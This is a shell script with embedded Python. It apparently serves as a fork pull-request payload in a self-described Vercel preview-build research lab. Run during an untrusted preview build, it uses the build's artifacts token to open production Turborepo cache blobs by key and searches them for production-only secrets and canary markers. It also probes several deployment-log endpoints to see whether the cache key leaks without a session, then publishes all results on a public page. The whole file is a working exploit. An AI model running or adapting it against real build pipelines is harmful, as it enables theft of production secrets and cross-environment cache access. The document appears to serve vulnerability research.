#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 13: round 12 proved the artifact
# store has no listing endpoint, but the production Turborepo cache blob is
# readable by key. Open that blob, and check whether a build can find the key
# from the deployment log without a session.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== 0. what this build is =="
  echo "env=${VERCEL_ENV:-unset} deployment=${VERCEL_DEPLOYMENT_ID:-unset}"
  PRODBASE="https://vercel-fork-rce-lab-boshjerns-projects.vercel.app"
  PRODLINE=$(curl -s -m 6 "$PRODBASE/prodmarker.txt" 2>&1 | head -1)
  echo "production marker: ${PRODLINE:-<no response>}"
  PROD_DPL=$(echo "$PRODLINE" | sed -n 's/.*build=\([^ ]*\).*/\1/p')
  export PROD_DPL
  echo "production deployment id: ${PROD_DPL:-<none>}"
  echo
  echo "== 1. open the two Turborepo cache blobs this project has uploaded =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import os, zlib, gzip, urllib.request as U, urllib.error as E
EP   = os.environ.get("VERCEL_API_ENDPOINT", "https://api.vercel.com")
TEAM = os.environ.get("VERCEL_ARTIFACTS_OWNER", "")
AT   = os.environ.get("VERCEL_ARTIFACTS_TOKEN", "")
Q    = "?teamId=" + TEAM

def get(url, auth=True):
    h = {"Authorization": "Bearer " + AT} if auth else {}
    try:
        r = U.urlopen(U.Request(url, headers=h), timeout=8)
        return r.status, r.read()
    except E.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return "ERR", repr(e)[:60].encode()

def uncompress(b):
    for fn in (zlib.decompress, gzip.decompress):
        try:
            return fn(b)
        except Exception:
            pass
    return None

KEYS = [("44fef76b3198d815", "the hash the PRODUCTION build printed"),
        ("d53e15d029696e78", "the hash a PREVIEW build computes")]
print("  key                 source                          code  comp  plain  contents")
for k, note in KEYS:
    code, body = get(EP + "/v8/artifacts/" + k + Q)
    raw = uncompress(body)
    t = (raw or b"").decode("latin1", "replace")
    first = " ".join(t.split())[:120]
    print("  %s  %-30s %s %5d %5d" % (k, note[:30], str(code), len(body), len(raw) if raw is not None else -1))
    print("      %s" % first)
    for probe in ("PROD-ONLY-SECRET", "P-labcanary", "secret.txt", "env=production", "env=preview"):
        if probe in t:
            print("      found: %s" % probe)
print()
print("== 2. can a build find the key from the deployment log without a session? ==")
DPL = os.environ.get("PROD_DPL", "")
logurls = [
    "https://vercel.com/boshjerns-projects/vercel-fork-rce-lab/logs?deploymentIds=%s" % DPL,
    "https://vercel.com/api/deployments/%s/build/log" % DPL,
    "https://vercel.com/api/deployments/%s/logs" % DPL,
    "https://vercel.com/api/v10/deployments/%s/logs" % DPL,
    "https://vercel.com/boshjerns-projects/vercel-fork-rce-lab/%s" % DPL,
]
print("  endpoint                                                    code  bytes  key in body")
for u in logurls:
    code, body = get(u, auth=False)
    hit = "44fef76b3198d815".encode() in body
    short = u.replace("https://vercel.com", "")
    print("  %-58s %-4s %6d %s" % (short[:58], str(code), len(body), "YES" if hit else "no"))
PYEOF
} > "$F" 2>&1
sleep 2
cat "$F"
